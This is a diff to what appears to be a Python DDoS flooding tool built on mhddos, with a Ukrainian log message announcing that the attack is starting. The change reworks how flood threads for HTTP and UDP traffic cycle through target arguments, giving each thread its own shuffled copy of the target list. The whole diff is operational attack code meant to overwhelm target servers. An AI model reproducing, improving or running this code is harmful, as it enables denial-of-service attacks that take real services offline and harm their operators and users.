@@ -7,7 +7,8 @@ from concurrent.futures import Future, Executor
 from concurrent.futures.thread import _WorkItem
 from contextlib import suppress
 from itertools import cycle
-from threading import Event, Lock, Thread
+import random
+from threading import Event, Thread, get_ident
 from time import sleep, time
 
 from src.cli import init_argparse
@@ -65,28 +66,19 @@ class DaemonThreadPool(Executor):
                 del work_item
 
 
-def thread_safe_cycle(kwargs_list):
-    it = cycle(kwargs_list)
-    lock = Lock()
-    while True:
-        try:
-            with lock:
-                value = next(it)
-        except StopIteration:
-            return
-        yield value
-
-
 class Flooder:
 
-    def __init__(self, event, args_iter):
+    def __init__(self, event, args_list):
         self._event = event
-        self._args_iter = args_iter
+        args_list = args_list[:]
+        random.shuffle(args_list)
+        self._args_iter = cycle(args_list)
 
     def __call__(self, *args, **kwargs):
         self._event.wait()
         while self._event.is_set():
             kwargs = next(self._args_iter)
+            # print(get_ident(), kwargs['url'])
             runnable = mhddos_main(**kwargs)
             with suppress(Exception):
                 runnable.run()
@@ -148,13 +140,11 @@ def run_ddos(
 
     logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
 
-    kwargs_iter = thread_safe_cycle(kwargs_list)
-    udp_kwargs_iter = thread_safe_cycle(udp_kwargs_list)
     for _ in range(total_threads):
-        thread_pool.submit(Flooder(event, kwargs_iter))
+        thread_pool.submit(Flooder(event, kwargs_list))
     if udp_kwargs_list:
         for _ in range(udp_threads):
-            udp_thread_pool.submit(Flooder(event, udp_kwargs_iter))
+            udp_thread_pool.submit(Flooder(event, udp_kwargs_list))
     event.set()
 
     if not (table or debug):
